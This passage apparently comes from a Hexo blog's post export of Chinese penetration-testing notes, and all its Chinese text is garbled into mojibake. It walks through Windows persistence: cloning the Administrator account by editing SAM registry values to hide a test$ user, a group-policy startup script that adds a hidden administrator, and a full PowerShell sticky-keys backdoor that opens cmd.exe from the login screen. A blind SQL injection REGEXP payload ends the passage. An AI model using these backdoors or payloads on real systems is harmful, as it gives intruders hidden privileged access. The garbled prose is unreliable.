<h5 id="2-æ‰“å¼€æ³¨å†Œè¡¨-regedit-ä¿®æ”¹æƒé™"><a href="#2-æ‰“å¼€æ³¨å†Œè¡¨-regedit-ä¿®æ”¹æƒé™" class="headerlink" title="2.æ‰“å¼€æ³¨å†Œè¡¨ regedit ä¿®æ”¹æƒé™"></a>2.æ‰“å¼€æ³¨å†Œè¡¨ regedit ä¿®æ”¹æƒé™</h5><p><code>HKEY_LOCAL_MACHINE\SAM\SAM</code> çš„adminstratoræƒé™ä¿®æ”¹ä¸ºå®Œå…¨æ§åˆ¶å’Œè¯»å–ï¼Œç„¶åé‡æ–°æ‰“å¼€æ³¨å†Œè¡¨ä¾¿å¯ç»§ç»­æŸ¥çœ‹å†…å®¹</p>
<h5 id="3-å¯¼å‡ºtest-è´¦æˆ·çš„reg-å’Œ-å¯¹åº”ç±»å‹ï¼ˆ0xXXçš„é‚£ä¸ªæ–‡ä»¶ï¼‰å’Œadministratorå¯¹åº”åå…­è¿›åˆ¶çš„æ³¨å†Œè¡¨"><a href="#3-å¯¼å‡ºtest-è´¦æˆ·çš„reg-å’Œ-å¯¹åº”ç±»å‹ï¼ˆ0xXXçš„é‚£ä¸ªæ–‡ä»¶ï¼‰å’Œadministratorå¯¹åº”åå…­è¿›åˆ¶çš„æ³¨å†Œè¡¨" class="headerlink" title="3.å¯¼å‡ºtest$è´¦æˆ·çš„reg å’Œ å¯¹åº”ç±»å‹ï¼ˆ0xXXçš„é‚£ä¸ªæ–‡ä»¶ï¼‰å’Œadministratorå¯¹åº”åå…­è¿›åˆ¶çš„æ³¨å†Œè¡¨"></a>3.å¯¼å‡ºtest$è´¦æˆ·çš„reg å’Œ å¯¹åº”ç±»å‹ï¼ˆ0xXXçš„é‚£ä¸ªæ–‡ä»¶ï¼‰å’Œadministratorå¯¹åº”åå…­è¿›åˆ¶çš„æ³¨å†Œè¡¨</h5><p>è·¯å¾„ä¸º<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code></p>
<h5 id="4-å°†test-å¯¹åº”çš„00000XXX-regçš„-Få€¼æ›¿æ¢ä¸ºadministrator-å¯¹åº”00000XXX-regçš„Få€¼"><a href="#4-å°†test-å¯¹åº”çš„00000XXX-regçš„-Få€¼æ›¿æ¢ä¸ºadministrator-å¯¹åº”00000XXX-regçš„Få€¼" class="headerlink" title="4.å°†test$å¯¹åº”çš„00000XXX.regçš„ Få€¼æ›¿æ¢ä¸ºadministrator å¯¹åº”00000XXX.regçš„Få€¼"></a>4.å°†test$å¯¹åº”çš„00000XXX.regçš„ Få€¼æ›¿æ¢ä¸ºadministrator å¯¹åº”00000XXX.regçš„Få€¼</h5><h5 id="5-åˆ é™¤test-ç”¨æˆ·"><a href="#5-åˆ é™¤test-ç”¨æˆ·" class="headerlink" title="5.åˆ é™¤test$ç”¨æˆ·"></a>5.åˆ é™¤test$ç”¨æˆ·</h5><p><code>net user test$ /del</code>  ï¼ˆåˆ é™¤åæ³¨å†Œè¡¨é‡Œçš„test$ç”¨æˆ·å°±æ— æ³•æ‰“å¼€äº†ï¼‰</p>
<h5 id="6-åœ¨cmdå¯¼å…¥test-çš„ä¸¤ä¸ªæ³¨å†Œè¡¨"><a href="#6-åœ¨cmdå¯¼å…¥test-çš„ä¸¤ä¸ªæ³¨å†Œè¡¨" class="headerlink" title="6.åœ¨cmdå¯¼å…¥test$çš„ä¸¤ä¸ªæ³¨å†Œè¡¨"></a>6.åœ¨cmdå¯¼å…¥test$çš„ä¸¤ä¸ªæ³¨å†Œè¡¨</h5><p>(è¿™æ ·å°±ä¸ä¼šåœ¨è®¡ç®—æœºç®¡ç†å’Œç™»å½•é¡µé¢çœ‹åˆ°åˆ›å»ºçš„è´¦æˆ·äº†ï¼Œä½†ä»å¯ä»¥åœ¨ç»„æˆä¸SAMä¸‹çœ‹åˆ°,ç™»å½•åä¼šåœ¨è®¡ç®—æœºç®¡ç†ä¸­æ˜¾ç¤ºè¯¥ç”¨æˆ·ï¼Œæƒ³è¦æ¸…é™¤è¯¥ç”¨æˆ·éœ€è¦åœ¨æ³¨å†Œè¡¨æ¸…é™¤)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">regedit  /s 1.reg</span><br><span class="line">regedit  /s 2.reg</span><br></pre></td></tr></table></figure>

<h5 id="7-ä½¿ç”¨3389ç™»å½•-ä¼š-ç™»é™†åˆ°administrator-çš„å½“å‰çŠ¶æ€ä¸‹-å®ç°adminstratorè´¦æˆ·çš„å…‹éš†"><a href="#7-ä½¿ç”¨3389ç™»å½•-ä¼š-ç™»é™†åˆ°administrator-çš„å½“å‰çŠ¶æ€ä¸‹-å®ç°adminstratorè´¦æˆ·çš„å…‹éš†" class="headerlink" title="7.ä½¿ç”¨3389ç™»å½• ä¼š ç™»é™†åˆ°administrator çš„å½“å‰çŠ¶æ€ä¸‹ å®ç°adminstratorè´¦æˆ·çš„å…‹éš†"></a>7.ä½¿ç”¨3389ç™»å½• ä¼š ç™»é™†åˆ°administrator çš„å½“å‰çŠ¶æ€ä¸‹ å®ç°adminstratorè´¦æˆ·çš„å…‹éš†</h5><br>

<h4 id="ç»„ç­–ç•¥"><a href="#ç»„ç­–ç•¥" class="headerlink" title="ç»„ç­–ç•¥"></a>ç»„ç­–ç•¥</h4><p>win+R    gpedit.msc æ‰“å¼€æœ¬åœ°ç»„ç­–ç•¥ç¼–è¾‘å™¨<br>é€‰æ‹©è®¡ç®—æœºç®¡ç†-&gt;WIndowsè®¾ç½®-&gt;è„šæœ¬(å¯åŠ¨/å…³é—­)  é€‰æ‹©å¯åŠ¨æˆ–å…³é—­ æ·»åŠ batè„šæœ¬</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">net user test<span class="variable">$</span> Test.<span class="number">123</span> /add</span><br><span class="line">net localgroup administrators test<span class="variable">$</span> /add</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<br>

<h4 id="ç²˜æ»é”®åé—¨"><a href="#ç²˜æ»é”®åé—¨" class="headerlink" title="ç²˜æ»é”®åé—¨"></a>ç²˜æ»é”®åé—¨</h4><h5 id="Shiftkey"><a href="#Shiftkey" class="headerlink" title="Shiftkey"></a>Shiftkey</h5><p><code>Set-ExecutionPolicy Unrestricted</code></p>
<p><code>Import-Module .\shiftkey.ps1</code></p>
<p>è¿è¡Œä¸€æ¬¡ä¼šå¯åŠ¨ å†æ¬¡è¿è¡Œä¼šåˆ é™¤<br>åœ¨ç”¨æˆ·ç™»å½•ä¸‹ä¸ºå½“å‰ç”¨æˆ·æƒé™ï¼Œåœ¨ç™»å½•ç•Œé¢ä¸ºsystemæƒé™</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$registryPath</span> = <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\&quot;</span> </span><br><span class="line"><span class="variable">$keyName</span> = <span class="string">&quot;sethc.exe&quot;</span> </span><br><span class="line"><span class="variable">$stringName</span> = <span class="string">&quot;Debugger&quot;</span> </span><br><span class="line"><span class="variable">$binaryValue</span> = <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span></span><br><span class="line"><span class="keyword">IF</span> (<span class="built_in">Test-Path</span> (<span class="variable">$registryPath</span> + <span class="variable">$keyName</span>)) </span><br><span class="line">&#123;</span><br><span class="line">      <span class="comment"># Sticky Keys backdoor exists.    </span></span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Registry key found. Let&#x27;s remove it.&quot;</span>    </span><br><span class="line">     <span class="comment">#New-Item -Path $registryPath -Name $keyName | Out-Null    </span></span><br><span class="line">     <span class="built_in">Remove-Item</span> <span class="literal">-Path</span> (<span class="variable">$registryPath</span> + <span class="variable">$keyName</span>) | <span class="built_in">Out-Null</span>    </span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Sticky Key backdoor has been removed.&quot;</span>    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">ELSE</span> </span><br><span class="line">&#123;    </span><br><span class="line">     <span class="comment"># Sticky Keys backdoor does not exist, let&#x27;s add it.    </span></span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Registry key not found. Attempting to add Sticky Keys backdoor to registry.&quot;</span>    </span><br><span class="line">     <span class="built_in">New-Item</span> <span class="literal">-Path</span> <span class="variable">$registryPath</span> <span class="literal">-Name</span> <span class="variable">$keyName</span> | <span class="built_in">Out-Null</span>    </span><br><span class="line">     <span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> (<span class="variable">$registryPath</span> + <span class="variable">$keyName</span>) <span class="literal">-Name</span> <span class="variable">$stringName</span> <span class="literal">-Value</span> <span class="variable">$binaryValue</span> | <span class="built_in">Out-Null</span>     </span><br><span class="line">     <span class="built_in">write-host</span> <span class="string">&quot;Sticky Keys backdoor added.&quot;</span>     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<h4 id="åŠ«æŒåé—¨"><a href="#åŠ«æŒåé—¨" class="headerlink" title="åŠ«æŒåé—¨"></a>åŠ«æŒåé—¨</h4><br>

<h4 id="æ³¨å†Œè¡¨"><a href="#æ³¨å†Œè¡¨" class="headerlink" title="æ³¨å†Œè¡¨"></a>æ³¨å†Œè¡¨</h4><br>

<h4 id="è®¡åˆ’ä»»åŠ¡"><a href="#è®¡åˆ’ä»»åŠ¡" class="headerlink" title="è®¡åˆ’ä»»åŠ¡"></a>è®¡åˆ’ä»»åŠ¡</h4><br>

<h4 id="æ–°æœåŠ¡"><a href="#æ–°æœåŠ¡" class="headerlink" title="æ–°æœåŠ¡"></a>æ–°æœåŠ¡</h4><br>

<h4 id="å†…å­˜é©¬"><a href="#å†…å­˜é©¬" class="headerlink" title="å†…å­˜é©¬"></a>å†…å­˜é©¬</h4>]]></content>
      <categories>
        <category>æƒé™ç»´æŒ</category>
      </categories>
      <tags>
        <tag>æƒé™ç»´æŒ</tag>
      </tags>
  </entry>
  <entry>
    <title>2022æ‚è®°</title>
    <url>/posts/9577635b/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="aabcab508b11d0a992952cd21e4d8f2ccbd50f495513e48e0933dcc7f552a6d5">de64d47ec3cf90f53a7fdcf21575326ecd162d2c313f107e80b63e07d8120cde3e4466977e3db5d0c2eb42cd3ecad58d26911a7998a8effb69c5a8da4df918b27099423330b0640d4380fc5e2e099fa4729fc0a665e546282cca006a2907f3ea10e5dae8a9fa32e28c4796b95710535a48cad46190f1fcf13140cb72f3b2106b778c7edfe5a20f758979febfcdd8de22cfbe3588949363525725785cd61c9835c8b74c3eb76db1b28aaf6d33feedc1c4820a1dc971b37895a7c4a8b129280461f8314e2c2e407bd5a78566aa46197513e3f2cf07e7e73662b0607d602db32aac7c6d727846cffb5540657704d059a330dc685f472f195efba99737d94dbf302920800f0b98af81726b45be935bc21c0b0c60fe3de6c8f6295fbab0a00e1a118ad9fad4c125c131e7d8eac55014eed80229db244bec6ff3ab32253c277c53605c7f3ce35a7821936dcd84de889b159263a9d222d501dbf2145f1d7f7df2139433684b63862e97b5965a3cac0dbb83fdfd5797e7e86105258b93a966e07d7f371764415c7161a68a5c261c44293a74cdebfc98f8fdb0c7bf83931e5a648ec5350fb4242f659cf63ba4f1e60d6558e7a8a8bcf00fb5b9e72d9737f0e47281dffb331aeaf903096b7aa7edcdbadcd5378626d0200197a50c629afa3ff29eda89b9c63f9974f83d78be7c0708e1b0857f6cdc28366c16a6c4d3e396ba1fdb67bc7f6953a6b20837637da3f2642cfcce26d58d0e2393c7a8b3e14cafa14a077c3240c32e243416677cb07bc9d317a0bb15264dde51021b4a620f45deb44565ff18395f5497b7d45240f0d1df542cbc882e8c5151d18a5a5b1221be6d14dbee0b73ff3f2aeb09648a61ff67123e227ae91d6e1cf5d7cec95012f5de6231300198a56c1fde5e261e515675cf161e2031660bd1dc5933bad4ea582e32a65dc1dd9bf4451be88daeaca9e173729686021a03d03682dd0b1623076007015728e0ba61df71982f4cec00c02122265a92e803ce3acffe4ad686b1ac563fc8f5277014200a2d32516c13606a13339b2bb85a9ee4c8d275838e2b7a793abc6c5a75f9b645b5813d5cc405dc090496f19fdc86abcbf9e3c312e3df3c3a3ec477ac465e7fff05052646482ddc3a3735bdb3ca73f4cc5373cf47abab81fcfec02757b19da6269829e43bfd1782879cc528c1f689bab2a7b4102e9da518d2082edf9ea8a540d8522e836661a22886d7868a8f316ee44cf6b1a7c8db7aebd9602d2c5a2537d9b5bdbe921448db6f5312f308b7005294777766efa998807d6c6e70560575fbb6f2b1bda5cdc7dca23391ebb4810bcf7b9aa041555613865dc3c644a41c7d216b163c0ce37b9efbfa641ec1e32a50c852c2510fec5142defdc3895b97751283e4cac2a5ffb921a9b99d7c7483ff5335bdb35826474d7157238275b193e573a2789c4df942a5126edaa34e03beaa9a88c853dfb5e07a082aa95ec50a132d9fe54ba02ad9cff1bb697144850cf49433364c3b449b067a4526ff9fe413e05b145da45bcb63ffa875770e7cced7acab05e6012541a8aae40d233cc607a6c9f9a6122334143acc4553eb2748ca3fe082fbd28fffcd6a0d68d58a456029bcb441d042ae91576cf418aac1aac21f0ae483089e381d799d26c64c9f41fcbbd4cc8463d7f3036c51e0c4a8a5df19f348776f8afca4a3675b8b8ee152b646470ab5713e90737faaf13711971c609bb9d530543dcc395595d9e72e07a5fd0eec76b6a2ac0fb1912f544e43a750be5c68c49657618129c9fcf13fc7a4f1c0abe8df117531a3579e1dfff0b9219beaae0c656bcc62fdb851beaa9780c0f2a01a93365f26bf9598dba85599965262fb769263bdc5bb724afc9c7165813e00b066649d9353492a899344fb92d93b2419253c897c2a1c06657aa0400a14e70fdaab9407d7041d40ee3b6cf8aad531df9a8376a7e69c7feea268291e841e7d843bbfdc333e6d80592299205b954cf6dffa9a814d01112ac8d335d9df06d038fb4b02370bcf208d3fb8f93d9a900b13ead6646acaf83fb4e09dc4d8625efe316969573629841f713a98bef15222e8ad51a699b2bc03ce0cd5716c804a7817fe267e83ccc26715763e23239945baa1c74d6ef0d64bdee6c52ed6913a8ddaeca94d1d9806c6bf27ac81488900dd9ef9bb8709fc0b28118e215c6415e023808f9fbd6edd5b1153cb1a4417968bc54559b10271f69dc8735ab214235ff1f5c32ac86acd25d5832853e686d65873cd1f27d4ae24fa8f8f64935717127007d81b82892166d20b93385660ee9ed5e33f1a706f55bcb298bdfe20d92644ef2afa7b3917b27465e1109f4381230996d6febdf6fc2950d446aa7d6c7ac9fc1ca08379f150cca522b7265592f51585b8793882425cdf8edb467bbfaf31802943f6e40a23c8cc19b35415f69b6aa4f545e9314a2a19e22a5903b8c0ef59aa5641a55861539992477a61fd850521fc7f8ac0782efb3e8048a4af88b218cae871fe4911e4b1e2074a27acdd97c9af7754d77d85caf4a421eb723070c3ed57834439f617ade89378c0d86573e9e6c324f6c1c9f21a79704d4d6332e8abe3ec7ac641365728d44345bb90e93be713a8ddfc6d9f97da3ea9cb43815dbcd1153758aed35a53c76b750a82d1225d3c9f8d2d062876ede472c7281002b96d9a0e67034c57970e5adf63f2d6c3ace2fb7f58199c395e47dd0108ca34ecc83c89f4a103765ab953e9e056fa27ab02a7906246b85b607fb2dccd1118e7b2ccc7408cddf62efd9dfc850d31b10c14045a33ea685df547e12088795d969bc6c8ef91a366fb151685d166eccf129d80b70be0d33c0786aa47f1aec282d94ee7d6ecc665696b3144d71c66bd75dd8f28c6fc40f7874c39c831550de71cbbb5550a8a511cbbc3b03077716f132502e903eb7cb342133c826d5b24cb6dcf1c2e5380c559e78b02f77c395a4a2b0ca400b7f2379944f6cab9945b5400777758c08b21982abf4783e6e2d08175eacf57a77b4141a623953bf9529eed8dc2de34372f7b7af6b756aa9f1f1b96cf87023f55b818f9e3846a779ed613a88540e31a1b9150470975442214e060330bb9e083879d2b8279d10270a135432b89cba93d02a4b9e9896a8cb6436e1cc6ba42ab6231a24c9f72239fd98c2e4c74488030183d2764d16777ece498f7508a2ecd2d0037b2bb38112a7c185064d96e98630fa04f84b2fd178372ad850e012c955cf611140b388efe0de63d1cd5af87b59d0accc00b53174dca4b2be1fcc92cc0499826db602a44f7f1f75e670edafe36f89b9397ede33ab4390ffd14bb6bca2c5f46d6141ecb3f1850cef12cb02c8c9d0d235df5e0994dc7325ab1953c0c064a5b9cf7cfd6a87693cdaf704108a08bfeda32d98a5ce98fc7839914825a518dc909716a622970a08f74f538b5a525866b0f30a1ee974d93d0cdfb72c0154809dde75bbf15f592a94424082697cba3b5138570aac3c03d9f0a6cb4c3d9cecfaf6e93ae54564ac65542c9b5a54139236894814d3d66f87916d14f3887f9c6accad675e05aed54fb888eda97b46607454c9005c97e1bfa8794ddfecf411d889f99c88ff09c88349bc2a04f8055d0185201229831ae98790310dd6b1700de8cc32e3710139edc94b0485fc7dda2134c99c172790b69d465f6fcf13c7a23cff2009c3f4d8e85d7481a9191aeda540714de5030271664a710f7c0acda930719cb6b36a4f6bbd9499057708e89c8a6afa8a6fb4abd90c936d064a2c7a4471dafca848399234d3a0dd12875b1c61eeacb3c33fad0ba7c40edc91fa91e68603cfa1093a1a17f9648afa6c01f02eb2e496f6108481b9bf1a693769deaaf0422f0d83cf40b325c9c1c5424743efd94346611d02d4b172b2b95b0cd08ef4ad7411627c26e2a04b182665c2f0de60328c6bee4ac3f947ed8465a27fb8dd3aea0c609c19d009ddfef8879a608ef107917b42e2633734793a8cd20c537915d7275c01aa5a72ccd90a04978dd0408181cfd97b091aaddd16ad5b0bf89cca1c5386e20ab05bec52dd8d8de571c1333457c37532699c937b486cbc84b47dd2fd2b5104b1cc5ee72fd6eaacecc06760fe2763703d75a0b256219d1e6b78c404afa558677a159a0bf964647b26c626388df6691f82677754438353a2c369f74eeac895e845a1469237e42a8b09b9620d147032736f1354978c76a9e448a31fa5d274960243f76d1298d18b34fc29b6cffb2582e775afd805db7e0979a1146ab3ea562f0289fc664d06b2484e01f81170dfb704eedaec3e3370a204f1c3c3436fc275c7f45111318855e71fa1fef666ea1e917f532ebf477a9f2dcf2efb264e302493d9b5a5a2a6572109babb5c84bacda07281087d5853b554d55728fd2a227a78814ab2240d8e33c4e7d3ff9c45e604339cd0dc67aea6a568f4b4d74a61b8965e924914f1838d1410612d847e3b7b46fff01036d8a5a066a21d96039045cbabb9a97ab46aff24d1766f442aa0f6cd36e9c1615429e7a9a15487379ecd5cca0151da613bae8b59b1da6db1a93f9ab8c739c3f93236cc1f8dc1f003a38794ee157d695dadfad6fa4959fb9daeebd983f98bf4c665b4164e8baadc08214dcf4a7c0cab5689f6d05d79a54fc81f8541dd897b4d1bcd1f6db2b748a161d73139900679dc74cb90a7d0d040f44befc6c6d12f96438356a9010e53cf7a35258aa43572d2492c32652b353b18f814a841fb691d3ae3fd41be74bfcbd6a58eac1aa8a9b098ba68cc01afbd4b4fc15c5893af1cd5e1125028cbc56456804c1aa2217c49547bb511d0458cba490137befb3cec72a2e8e26244a8398bb761b5fe78a6afefc40bf355864b7ecba87a194900167421a70ded5929e84086b2f374bd1c1842c102ec0cf90eff1f3bcd5614fd8021b7df67a1121fc290bfbc95129a4a8b8f2c2544fbf17b58d1decd5ed4db361408ea75db4f3b9e1afac801137884ee72107f40199e9e7b63b60a52a46e37d9316e1dbf19c08e4381259b4bd064d0b26e7402d6adcb86c65451a274ad6d90fbf1ef994fdf00afe4012997409418fc2ea97d451a4bf37100d830c3453a5a9b58080848778d8501025484828c0bad849b1a3fbcb0de7743f4148bf863207f80c5676a1d465b66bfb9e6ee5b0371e6ab9fbd4363ed76beab20be4c6a0ecd9ba678796808bb1a2ce6eff14c758d07ee5db9e91fdff08ef9936f9edf8e8bb7b97f898ad3454d5f17982f9ae8f1a3e1bc1da2fb4c368e0df2d382d532b9a5f9d6c39f8059c6dc03b6bab553069170c604a35ec903a3ed38752ed48d343d9ad1092872d768bf07beaf1b46cc1f4e236be366027f12386298f694d6a3f5a02bd5633427bddbef79fb770f963ef357c4180bf90d6f987a3cb56f09a7634d948206a11cd168a303d62159334adfcdab105c1ec0d8c2dc6fe7e04e70a68bd4ec8775b55078edd39d1d8d0bc26b8547f1344fa90298620d4ec061e13d8f1c6792dc6ccd98692a4d9411573e7b1cb099fbc402c30228a842401899f95cea055991720d5d929acfbf55e33e4e50404e3090fb815385633053493ffeb9e3c71cc5f7dc6c554cf5ed99b29ece6ca1424b618a319aaf6ded1f0b9b7173d3a860c879dcd09bd5d23a4f907d068d478f15ccd361997b68d0779e26eed4de2819a9b9de10292b7d0fea71fb973b9506bd739aaa766ee3acfa8ead79eef613b04c7a1f64523e89c01d92abfc85dd50e100220b3172bbab94c368ffb0dac38e37f45773e8dcd38155fe5b830818dcbbc563566e79f6914887c36cb11deb78ba276aad52bcb0f1072834443b59f3ba7df0e56bba63166e77ba6c1e6f869b8a26a90c9a78637d9b2a79803011e47fd56a14c727dd876c965b5cd4acfec089b6ec424a670054675df8554e34eef69a365899a162e2f2fa0586707860ef2b7ffc3f00591bf6d782aa18f8e7207d24f0d9a120fb97457a0f5225d21b56a1e88f06aed8f646de498d2f4c596cd007b3f206902be883abd28f017a5d383f6acdcf3abea47d86cdc9e0adc36c1803e413d49218529c08de96c6f71102644fb2e92a6aaa3107b884e4ca32ba014a5b25b2e0fb863be131753bd780ac9a7a7774987908e2737fe8d4287e6f7fd7ce72f4501eab73f7068af4b8fba52e8cf707d6ca51dbac746c97a32155ff35b396cba457adf368e70eac50955e4cc692c83299e986ea4689261e7395d64db2aefa96ee10bea2e538c7f69b75d4d797e97124bf65642ccd0f2ec3e860b1e8d07160d5523c17dafd27144ef9e965c550946db7e40c31611a3d0dfb0d8860403bf8fd3fdfaf92af42d5d5cf04e7f87749863d08332ed1d9094c5b6d3a5ca20e4eb3fc7c7487db49fca09de63938c4331370b566e1cd1ae1efb52c9a0cf050591178195d7668da4d59b255ee8431259c1a48bd11edc14d7aed40ab8583b52c167610642058c8c16ddb3b84216753b68d1042405ef7e34d521fe9087852ad350c125b707461037bbb9283d8ff300b703c47bd8364818f64aea71d8133a5b3d3ce7057dd1bdecf2f343b1308998c20407c9b833970645827f0278667aeb0b273b395423ea4e7e99862717c9d12efa0cfd956d101473561753099b4fca020d6f6497c7280b7107b6da472e4d2cbec76747c027fa2ab7c68357d15057adcc5d3fb489eb2563831bf8dbac4cffa1429167cff47dadfadadfa372d900af5a7bd751f1f5ef1675c566f843f4138af6047db9fcbe5561b4c238e879c5b37c0c3e15a3910b3002098bd8f5fd41a1d0308ee40463a4e0bf0722d0b580b4be1543fdd9bcc4bad6a77fa740bd1979d5cf6092c94d4f9bf9278e1e669526ae5ed53b9bc45f61e051aa76eea578ca4bdcfc26e92cf0e2468bf6669cb2dbea5d80d0264f62578b47b632e494095d26d1935b2540eef4e4f5e9ac06ec3e56303ee28a96ca3ab2551051142ae7f8bc6831a484253dd2f6862435f6c33ffc035db38c5aafc75f0da97cf2bdaf5f904b186044662991ab5c5b260cea2dcffd34743dec4269f22f0eb027fe9a38d1d5688230225edcf130285caff59c2b56403984df4892f049d7c60c878dd99b090563efd33e5b9a6dfeaead81655add526ff917663e5ed8383f75b45efe9fed5b87a59ba1e970337bd20294f0499f5aef06824a8c1bdfb99e3ed13280d4e690dc8583906b9e4a6eea2f12e2170c3c295b350eaa92692987c533545176d500220d1dd7c19858a5ace6862c82ce123968fd1ff24698081a4c0a2e75b7fab82155b7a8929f715886d0cdc29d625efcf9a8f7f339f678d4334c02c31be32ce0b862e4fba84553eb8217b2ee4beaccd6375b8ee3b735e039ee54db936af33da9da3c135a0975ab5c79b06ac0a08ebf1c26518226fe94c817b6730f8470c8cf7e011d20348814610b0b0641a5435c15102fda225ff7ed227c7a8ec208bc0aa69e145e51e96341ca5fa81b36d884e73af6435eb7ae2b0ee6665e08ba291f387c1474f658785c3b32eb0cb57136d39e53258b7b991bf72f345e150e7ba3dfc3bace635e0b64678a64853bf5c111bc746bf22463f4eda8062ca70fe2f261b14f8e21838a0aeaf225a12658333b21c0ecdf27d63d8eb7b732b10acf6c04f06f44ec3c0d0e4f67b5ff6a4e8e3262f97969d0ea71cbde25be0536ed12dbb065daf614317fc18ae702628a0333aa53ba30de51afefd6864848bc4d84d7ec27b5e17ba20c63a323bef121ca0534a817ba83ff12d1f0fda9114162743fa5a135e9f62ce28a5f5be942689c6c580666bd985d9585212b5397062639f930b93dc8afed8dc337ec78ff9fea14224bd1f484a825857fd4e7d9730472e3db026efcf9bb0ace31cc72efb8f3fd48919df1cf80bac3194223cebf624772b12c20a477a39ef6004f22c19800adb675361dee8bd412766e9c91966bd85741aa34ffd513e0ec386821a2a2eec8f746c7c8ac96e6729e1d6f61710db0942c113462d682b05e3d0c828c6cc39cd5cef5832178bf1f65448f1db2fca0998f703f8ab13a81f707a1ac62bae0da6ca8d25b00f06b15c6f1f493fdd189c574888c96380c93a93d2d16a785d1045f42053d66db3aa0564e47253dd87c8f4175c02959feea0cd1a9632322a513be02edf095cc40fd4a64560543bc264632f9564929bac947b75929606edf4ee047f28cfb9b29ed37c0b8841c655b5061f5f02058835332732d130f3bc342a8aee2aa8bdddda6c4640845ec69b8204bb88284a12a14d422d177172e84014e42766fbe3f40bd0a0f8ddaad6f8c06d58a8d436e8962fa064cf5dd061613d0dc7e6267c6da0176e5c404532671b19f38884311ea7ec810870abd2cb5c8b159286dff832535263a3ed80bdc132e334974e856bea1777ae396a4245c04b88a07afeeab9ae0bfeecaf7550af9df14b4228b976ddbe020a5e8a25d6966206da6a96313168aa55822520547706ac61da3e0ea1e9f8977058f429ed5ce738b27b6ddc78bb40c0ab3f310de4c39b05228238c7e1a6e01b20e62f2a5d53cea2482cc06b87022afd4681a4856688a38058b69b2af536ea28d29ccf2fe903acf9193287233a200b01241a16141e58056f180ee95510cd238f93505955ce80a806707435515d0bd6abed1186d116135ddf612555d744027ba27e0138a95aa5f8072ee2aa7b2ef942e3035e48d4f6c37da20f0f07e28ee9ae6622c0833de304f24251c97af089c908012a3e0febde3d5d8aae101111f0f2c0acb602612ac0865816e6ab9278587f485a1b9294b87926e7198ca92a1a799df57d6b44947c9b3556e9f0992f32ef068273f3944761c30b2b114d7a8fd8a56c79ac4dd0792b6f8c953c44201139fa2954db6962bb04c5f6a44c79862bd3dbfc57fdfcee5df7b62535e6d43ec6b97a3ab43262b542259eea8bca81badf7b2a3f1c590c5880f90a7d9720d2464a464cd8bbbb6a9dc2d970f54117babec9d031a80ca6948846e86af8cf0b1a9f6e5b716b629879d05ea9b987785bc892db4f90ce61b18953de4ab66afcf61801bdbacfb17eaf089579d7f6eb9c7a9ac4660b94915863c6e872f63064a91abeaf0054c8ea2d838ebd3d397ca226a1cf42c1b4f76c4b7d6e26dfff8d05e9295475af058a91f71bfbe9ba7fcbb49c6a34588c19b963e72e7a87fd971d45d9d21e33a101d36ab6679ab27e8b6b9874ea4d03bf840eaf46d79785a670d16f46fc129758f933c84599722362c45badcd723d16fa90ec259bf0efe6960381400ae1358a86a6299b1b53d7f6003ff5cab04f43116c84db61c339507d383cc7be403569b2671fd3ed71bbd1c8909111193efb9a951d730e3f34d7034887996d6efc6e6548d35c8e031cea30e2e5535adfa524779349eb3847a19c178466532c75cdd17b1615777d1b7b5e2339c2b2eb52a38e3eda8c46bc1f63321ec86d1eea2836a1f99fc9df557dac56d779c7ebd384e39709d816e4ec18e903fec9370b23872b983cb4402ca8175ee93c066c9c6396dd483595b89496ee348d7bb302a23c365185532a56a21e20952d13f326dbbf0ae8f84491c5f4427a849f79de9002ef9553e0a894f2278e7843fec5745196fba00890e0a2419d4f3b58ce10b913d863aaf515a2b0e92af35fce5601de1390ac8eee7a0dd10de7883bf8b6fce7a0dd00a5514b23ef6b0ac84b27ffbd257eb214b240af928f3e4893283c3a36e973320584cfa3040a3c4f448ca81d3213bfc5d06ccb106de6c8c9690d4e848219dc4a3c777b2ada15ff7501c874bf34b3cdabfc6ed0558c2d21b9614f71b0673d132f20143725d46015c9fbd137469cb</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>æ‚è®°</category>
      </categories>
      <tags>
        <tag>æ‚è®°</tag>
      </tags>
  </entry>
  <entry>
    <title>Regexpæ³¨å…¥</title>
    <url>/posts/6cc02bf9/</url>
    <content><![CDATA[<p>ç›´æ¥æŸ¥è¯¢è‡ªå·±éœ€è¦çš„æ•°æ®ï¼Œç„¶åé€šè¿‡æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é… ç”¨äºç›²æ³¨ä¸­</p>
<br>

<p>regexp â€˜^[a-z]â€™ åˆ¤æ–­ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯å¦åœ¨a-zä¸­</p>
<p><code>and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;security&quot; AND table_name REGEXP &#39;^[a-z]&#39; LIMIT 0,1) </code>    # åˆ¤æ–­ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ä¸æ˜¯ a-z</p>
<br>

